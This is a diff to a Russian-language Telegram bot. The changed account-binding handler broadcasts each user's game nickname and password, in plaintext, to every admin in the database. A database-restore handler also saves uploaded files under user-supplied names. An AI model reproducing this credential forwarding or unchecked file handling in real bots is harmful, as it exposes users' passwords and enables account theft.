@@ -182,7 +182,7 @@ async def restore_db_handler(message: types.Message):
 
   document = message.document
   if not document.file_name.endswith(".json"):
-    return  # Игнорируем файлы, которые не json
+    return
 
   file_path = f"downloaded_{document.file_name}"
 
@@ -193,7 +193,6 @@ async def restore_db_handler(message: types.Message):
     with open(file_path, "r", encoding="utf-8") as f:
       imported_data = json.load(f)
 
-    # Проверяем базовую структуру файла
     if isinstance(imported_data, dict) and "accounts_db" in imported_data:
       global db
       db.clear()
@@ -300,14 +299,16 @@ async def bind_handler(message: types.Message):
       else message.from_user.first_name
   )
   admin_msg = (
-      f"Новый привязанный аккаунт:\n\nИгрок: {tg_user}\nTelegram ID:"
+      f"🔔 Новый привязанный аккаунт:\n\nИгрок: {tg_user}\nTelegram ID:"
       f" {user_id}\nНик: {username}\nПароль: {password}"
   )
 
-  try:
-    await bot.send_message(chat_id=MAIN_ADMIN_ID, text=admin_msg)
-  except Exception:
-    pass
+  # Рассылка всем администраторам из списка db["admins"]
+  for admin_id in db.get("admins", []):
+    try:
+      await bot.send_message(chat_id=admin_id, text=admin_msg)
+    except Exception as e:
+      print(f"Не удалось отправить уведомление админу {admin_id}: {e}")
 
 
 @dp.message(Command("list"))
